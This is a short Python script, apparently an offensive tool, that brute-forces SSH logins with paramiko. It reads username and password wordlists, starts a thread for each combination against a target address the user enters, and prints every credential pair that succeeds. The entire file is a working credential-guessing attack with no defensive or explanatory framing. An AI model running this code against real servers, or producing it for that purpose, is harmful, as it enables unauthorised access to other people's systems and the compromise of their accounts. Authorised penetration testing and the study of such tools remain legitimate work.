import paramiko
import sys
import os
import threading
import time

valid_combinations = []

def ssh_connect(username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        valid_combinations.append((username, password))
        print('[+] Found Password: ' + password + ', For Account: ' + username)
    except:
        print('[-] Incorrect Login: ' + username + ' / ' + password)
    ssh.close()

host = input('[+] Target Address: ')
usernames_file = 'usernames.txt'  # File containing usernames
input_file = 'passwords.txt'  # File containing passwords

if not (os.path.exists(usernames_file) and os.path.exists(input_file)):
    print('[!!] One of the files does not exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' * * *')

def read_file(filename):
    data = []
    with open(filename, 'rb') as file:
        for line in file:
            try:
                line = line.decode('utf-8').strip()
                data.append(line)
            except UnicodeDecodeError:
                pass  # Skip lines that can't be decoded with UTF-8
    return data

usernames = read_file(usernames_file)
passwords = read_file(input_file)

threads = []

for username in usernames:
    for password in passwords:
        t = threading.Thread(target=ssh_connect, args=(username, password))
        threads.append(t)
        t.start()
        time.sleep(1)

# Wait for all threads to finish
for t in threads:
    t.join()

print('\n[+] All Valid Matches:')
for username, password in valid_combinations:
    print('Username:', username, 'Password:', password)
